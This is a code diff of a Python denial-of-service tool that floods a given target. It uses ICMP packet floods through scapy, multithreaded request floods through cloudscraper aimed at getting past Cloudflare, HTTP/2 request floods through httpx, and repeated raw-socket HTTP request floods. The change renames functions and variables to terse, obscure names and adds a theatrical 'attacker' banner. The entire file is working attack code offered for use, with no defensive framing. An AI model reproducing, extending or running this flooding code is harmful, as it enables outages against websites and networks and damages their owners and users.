@@ -1,22 +1,20 @@
 from scapy.all import *
-import time
-import sys
-import cloudscraper
-import datetime
-import threading
-import random
-import socks
+import time as t
+import sys as s
+import cloudscraper as c
+import datetime as d
+import threading as th
+import random as r
+import socks as sk
 import ssl
-import httpx
-import socket
-from urllib.parse import urlparse
-from colorama import Fore, init
+import httpx as hx
+import socket as so
+from urllib.parse import urlparse as up
+from colorama import Fore as F, init as i
 
-# Initialize colorama
-init(convert=True)
+i(convert=True)
 
-# User-agent list
-ua = [
+_u = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (X11; Linux x86_64)",
@@ -24,166 +22,159 @@ ua = [
     "Mozilla/5.0 (Android 11; Mobile)"
 ]
 
-def countdown(t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while (until - datetime.datetime.now()).total_seconds() > 0:
-        sys.stdout.flush()
-        sys.stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack status => " + str(int((until - datetime.datetime.now()).total_seconds())) + " sec left ")
-        time.sleep(1)
-    sys.stdout.flush()
-    sys.stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack Done !                                   \n")
+_m = (
+    "I am thou, thou art I.\n"
+    "With great power comes will. You have summoned thee for thy bidding\n"
+    "Very well...\n"
+    "I shall do as you wish\n"
+    "I am the attacker, thou art the attacked. Together, we dance in the chaos.\n"
+    "Prepare thyself, for the assault begins now.\n"
+)
 
-def arsene_dos_attack(target_ip, interface="eth0", packet_count=1000):
-    arsene_sequence = (
-        "I am thou, thou art I.\n"
-        "With great power comes great responsibility, and I, Arsène, wield the power of Persona to strike you down.\n"
-        "Thy network shall feel my wrath, for I am the storm that engulfs thee.\n"
-        "With each packet, I assert my dominance, for thou art but a mere mortal to my digital might.\n"
-        "I am the attacker, thou art the attacked. Together, we dance in the chaos of the network.\n"
-        "Prepare thyself, for the assault begins now.\n"
-    )
+def _speak():
+    for x in _m:
+        print(x, end='', flush=True)
+        t.sleep(0.015)
+    t.sleep(1)
 
-    print(arsene_sequence)
-    time.sleep(2)  # Dramatic pause
+def _z(n):
+    e = d.datetime.now() + d.timedelta(seconds=int(n))
+    while (e - d.datetime.now()).total_seconds() > 0:
+        rem = int((e - d.datetime.now()).total_seconds())
+        print(f"{F.MAGENTA}[*] {F.WHITE}Attack status => {rem} sec left ", end='\r', flush=True)
+        t.sleep(1)
+    print(f"{F.MAGENTA}[*] {F.WHITE}Attack Done!{' ' * 30}")
 
+def _a(ip, iface="eth0", cnt=1000):
     try:
-        send(IP(dst=target_ip)/ICMP(), iface=interface, count=packet_count, verbose=0)
-        print(f"\nAttack on {target_ip} completed with {packet_count} packets sent.")
+        send(IP(dst=ip)/ICMP(), iface=iface, count=cnt, verbose=0)
+        print(f"\nAttack on {ip} completed with {cnt} packets sent.")
     except KeyboardInterrupt:
-        print("\nAttack interrupted by user.")
+        print("\nInterrupted.")
     except Exception as e:
-        print(f"\nAn error occurred: {e}")
+        print(f"\nError: {e}")
 
-def get_target(url):
-    url = url.rstrip()
-    parsed = urlparse(url)
-    target = {
-        'uri': parsed.path if parsed.path else "/",
-        'host': parsed.hostname,
-        'scheme': parsed.scheme,
-        'port': parsed.port if parsed.port else ("443" if parsed.scheme == "https" else "80")
+def _g(u):
+    p = up(u)
+    return {
+        'uri': p.path if p.path else "/",
+        'host': p.hostname,
+        'scheme': p.scheme,
+        'port': p.port if p.port else ("443" if p.scheme == "https" else "80")
     }
-    return target
 
-def launch_cfb(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    scraper = cloudscraper.create_scraper()
-    threads = []
-
-    for _ in range(int(th)):
+def _lc(u, thx, dur):
+    e = d.datetime.now() + d.timedelta(seconds=int(dur))
+    scr = c.create_scraper()
+    q = []
+    for _ in range(int(thx)):
         try:
-            thd = threading.Thread(target=attack_cfb, args=(url, until, scraper))
-            thd.start()
-            threads.append(thd)
-        except Exception as e:
-            print(f"Error starting thread: {e}")
+            x = th.Thread(target=_cc, args=(u, e, scr))
+            x.start()
+            q.append(x)
+        except Exception as ex:
+            print(f"CFB thread error: {ex}")
+    for x in q:
+        x.join()
 
-    for thd in threads:
-        thd.join()
-
-def attack_cfb(url, until_datetime, scraper):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+def _cc(u, end, s):
+    while (end - d.datetime.now()).total_seconds() > 0:
         try:
-            scraper.get(url, timeout=15)
-        except Exception as e:
-            print(f"Error in CFB attack: {e}")
+            s.get(u, timeout=15)
+        except Exception as ex:
+            print(f"CFB err: {ex}")
 
-def launch_http2(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads = []
+def _lh2(u, thx, dur):
+    e = d.datetime.now() + d.timedelta(seconds=int(dur))
+    q = []
+    for _ in range(int(thx)):
+        x = th.Thread(target=_hh2, args=(u, e))
+        x.start()
+        q.append(x)
+    for x in q:
+        x.join()
 
-    for _ in range(int(th)):
-        thd = threading.Thread(target=attack_http2, args=(url, until))
-        thd.start()
-        threads.append(thd)
-
-    for thd in threads:
-        thd.join()
-
-def attack_http2(url, until_datetime):
-    headers = {
-        'User-Agent': random.choice(ua),
+def _hh2(u, end):
+    h = {
+        'User-Agent': r.choice(_u),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
         'Accept-Language': 'en-US,en;q=0.9',
         'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
     }
-    client = httpx.Client(http2=True)
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+    cli = hx.Client(http2=True)
+    while (end - d.datetime.now()).total_seconds() > 0:
         try:
-            client.get(url, headers=headers)
-        except Exception as e:
-            print(f"Error in HTTP/2 attack: {e}")
+            cli.get(u, headers=h)
+        except Exception as ex:
+            print(f"H2 err: {ex}")
 
-def launch_soc(url, th, t):
-    target = get_target(url)
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-
-    req = (
-        f"GET {target['uri']} HTTP/1.1\r\n"
-        f"Host: {target['host']}\r\n"
-        f"User-Agent: {random.choice(ua)}\r\n"
+def _ls(u, thx, dur):
+    tgt = _g(u)
+    e = d.datetime.now() + d.timedelta(seconds=int(dur))
+    rq = (
+        f"GET {tgt['uri']} HTTP/1.1\r\n"
+        f"Host: {tgt['host']}\r\n"
+        f"User-Agent: {r.choice(_u)}\r\n"
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
         "Connection: Keep-Alive\r\n\r\n"
     )
-
-    threads = []
-    for _ in range(int(th)):
+    q = []
+    for _ in range(int(thx)):
         try:
-            thd = threading.Thread(target=attack_soc, args=(target, until, req))
-            thd.start()
-            threads.append(thd)
-        except Exception as e:
-            print(f"Error starting thread: {e}")
+            x = th.Thread(target=_sc, args=(tgt, e, rq))
+            x.start()
+            q.append(x)
+        except Exception as ex:
+            print(f"SOC thread error: {ex}")
+    for x in q:
+        x.join()
 
-    for thd in threads:
-        thd.join()
-
-def attack_soc(target, until_datetime, req):
+def _sc(tgt, end, rq):
     try:
-        if target['scheme'] == 'https':
-            s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((str(target['host']), int(target['port'])))
-            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+        if tgt['scheme'] == 'https':
+            sck = sk.socksocket()
+            sck.setsockopt(so.IPPROTO_TCP, so.TCP_NODELAY, 1)
+            sck.connect((str(tgt['host']), int(tgt['port'])))
+            sck = ssl.create_default_context().wrap_socket(sck, server_hostname=tgt['host'])
         else:
-            s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((str(target['host']), int(target['port'])))
+            sck = sk.socksocket()
+            sck.setsockopt(so.IPPROTO_TCP, so.TCP_NODELAY, 1)
+            sck.connect((str(tgt['host']), int(tgt['port'])))
     except Exception as e:
-        print(f"Connection error in SOC: {e}")
+        print(f"Conn err: {e}")
         return
-
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+    while (end - d.datetime.now()).total_seconds() > 0:
         try:
             for _ in range(100):
-                s.send(str.encode(req))
-        except Exception as e:
-            print(f"Error in SOC attack: {e}")
-            s.close()
+                sck.send(str.encode(rq))
+        except Exception as ex:
+            print(f"SOC err: {ex}")
+            sck.close()
             break
 
 if __name__ == '__main__':
-    if len(sys.argv) != 5:
-        print("Usage: python arsene_dos.py <method> <target> <threads> <time>")
-        sys.exit(1)
+    if len(s.argv) != 5:
+        print("Usage: python arsene_dos2.py <method> <target> <threads> <time>")
+        s.exit(1)
 
-    method = sys.argv[1].rstrip().lower()
-    target = sys.argv[2].rstrip()
-    threads = sys.argv[3].rstrip()
-    duration = sys.argv[4].rstrip()
+    m, tgt, thx, dur = s.argv[1].strip().lower(), s.argv[2].strip(), s.argv[3].strip(), s.argv[4].strip()
 
-    timer = threading.Thread(target=countdown, args=(duration,))
-    timer.start()
+    if m in ["cfb", "http2", "soc", "arsene"]:
+        _speak()
+        tim = th.Thread(target=_z, args=(dur,))
+        tim.start()
 
-    if method == "cfb":
-        launch_cfb(target, threads, duration)
-    elif method == "http2":
-        launch_http2(target, threads, duration)
-    elif method == "soc":
-        launch_soc(target, threads, duration)
+        if m == "cfb":
+            _lc(tgt, thx, dur)
+        elif m == "http2":
+            _lh2(tgt, thx, dur)
+        elif m == "soc":
+            _ls(tgt, thx, dur)
+        elif m == "arsene":
+            _a(tgt)
+
+        tim.join()
     else:
-        print("No method found.\nMethod: cfb, http2, soc")
-
-    timer.join()
+        print("Method not found. Use: cfb, http2, soc, arsene")
